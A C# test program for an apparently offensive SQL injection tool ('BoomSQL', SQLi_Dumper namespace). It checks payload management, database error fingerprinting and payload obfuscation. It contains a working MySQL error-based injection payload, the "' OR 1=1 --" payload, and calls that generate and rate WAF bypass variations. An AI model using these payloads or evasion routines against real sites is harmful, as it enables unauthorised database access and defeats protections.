using System;
using System.Collections.Generic;
using System.Linq;
using DataBase;
using SQLi_Dumper;

/// <summary>
/// Test class to verify the enhanced SQL injection functionality
/// </summary>
public class EnhancedSQLiTest
{
    public static void Main(string[] args)
    {
        Console.WriteLine("BoomSQL Enhanced Features Test");
        Console.WriteLine("==============================");
        
        TestPayloadManager();
        TestErrorSignatures();
        TestPayloadEncoder();
        
        Console.WriteLine("\nAll tests completed successfully!");
    }
    
    private static void TestPayloadManager()
    {
        Console.WriteLine("\n1. Testing PayloadManager...");
        
        var payloadManager = PayloadManager.Instance;
        
        // Test getting error-based payloads for MySQL
        var mysqlErrorPayloads = payloadManager.GetPayloads(
            PayloadManager.PayloadCategory.ErrorBased, 
            Types.MySQL_With_Error
        );
        
        Console.WriteLine($"   MySQL Error Payloads: {mysqlErrorPayloads.Count}");
        if (mysqlErrorPayloads.Count > 0)
        {
            Console.WriteLine($"   Example: {mysqlErrorPayloads[0]}");
        }
        
        // Test getting time-based payloads for MSSQL
        var mssqlTimePayloads = payloadManager.GetPayloads(
            PayloadManager.PayloadCategory.TimeBased, 
            Types.MSSQL_No_Error
        );
        
        Console.WriteLine($"   MSSQL Time Payloads: {mssqlTimePayloads.Count}");
        if (mssqlTimePayloads.Count > 0)
        {
            Console.WriteLine($"   Example: {mssqlTimePayloads[0]}");
        }
        
        // Test adding custom payload
        payloadManager.AddPayload(
            PayloadManager.PayloadCategory.ErrorBased,
            Types.MySQL_With_Error,
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(CHAR(58),CHAR(58),([t]),CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'x'='x"
        );
        
        var updatedPayloads = payloadManager.GetPayloads(
            PayloadManager.PayloadCategory.ErrorBased, 
            Types.MySQL_With_Error
        );
        
        Console.WriteLine($"   Updated MySQL Error Payloads: {updatedPayloads.Count}");
        Console.WriteLine("   ✓ PayloadManager test passed");
    }
    
    private static void TestErrorSignatures()
    {
        Console.WriteLine("\n2. Testing ErrorSignatures...");
        
        var errorSignatures = ErrorSignatures.Instance;
        
        // Test MySQL error detection
        var mysqlErrorResponse = "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''injected' at line 1";
        var mysqlResult = errorSignatures.AnalyzeResponse(mysqlErrorResponse);
        
        Console.WriteLine($"   MySQL Error Detection: {mysqlResult.ConfidenceScore}% confidence");
        Console.WriteLine($"   Database Type: {mysqlResult.DatabaseType}");
        Console.WriteLine($"   Matched Signatures: {mysqlResult.MatchedSignatures.Count}");
        
        // Test MSSQL error detection
        var mssqlErrorResponse = "Microsoft SQL Server Error: Unclosed quotation mark after the character string 'injected'.";
        var mssqlResult = errorSignatures.AnalyzeResponse(mssqlErrorResponse);
        
        Console.WriteLine($"   MSSQL Error Detection: {mssqlResult.ConfidenceScore}% confidence");
        Console.WriteLine($"   Database Type: {mssqlResult.DatabaseType}");
        Console.WriteLine($"   Matched Signatures: {mssqlResult.MatchedSignatures.Count}");
        
        // Test signature counts
        var mysqlSignatureCount = errorSignatures.GetSignatureCount(Types.MySQL_With_Error);
        var totalSignatures = errorSignatures.GetTotalSignatureCount();
        
        Console.WriteLine($"   MySQL Signatures: {mysqlSignatureCount}");
        Console.WriteLine($"   Total Signatures: {totalSignatures}");
        Console.WriteLine("   ✓ ErrorSignatures test passed");
    }
    
    private static void TestPayloadEncoder()
    {
        Console.WriteLine("\n3. Testing PayloadEncoder...");
        
        var encoder = PayloadEncoder.Instance;
        var originalPayload = "' OR 1=1 --";
        
        // Test URL encoding
        var urlEncoded = encoder.Encode(originalPayload, "url");
        Console.WriteLine($"   URL Encoded: {urlEncoded}");
        
        // Test mixed case obfuscation
        var mixedCase = encoder.Obfuscate(originalPayload, "mixed_case");
        Console.WriteLine($"   Mixed Case: {mixedCase}");
        
        // Test comment injection
        var commented = encoder.Obfuscate(originalPayload, "comment_injection");
        Console.WriteLine($"   Comment Injection: {commented}");
        
        // Test generating variations
        var variations = encoder.GenerateVariations(originalPayload);
        Console.WriteLine($"   Generated Variations: {variations.Count}");
        
        // Test WAF bypass variations
        var wafBypass = encoder.GenerateWAFBypassVariations(originalPayload);
        Console.WriteLine($"   WAF Bypass Variations: {wafBypass.Count}");
        
        // Test WAF bypass detection
        var isLikelyToBypass = encoder.IsLikelyToBypassWAF(urlEncoded);
        Console.WriteLine($"   Likely to bypass WAF: {isLikelyToBypass}");
        
        // Test available methods
        var encodingMethods = encoder.GetAvailableEncodingMethods();
        var obfuscationMethods = encoder.GetAvailableObfuscationMethods();
        
        Console.WriteLine($"   Available Encoding Methods: {encodingMethods.Count}");
        Console.WriteLine($"   Available Obfuscation Methods: {obfuscationMethods.Count}");
        Console.WriteLine("   ✓ PayloadEncoder test passed");
    }
}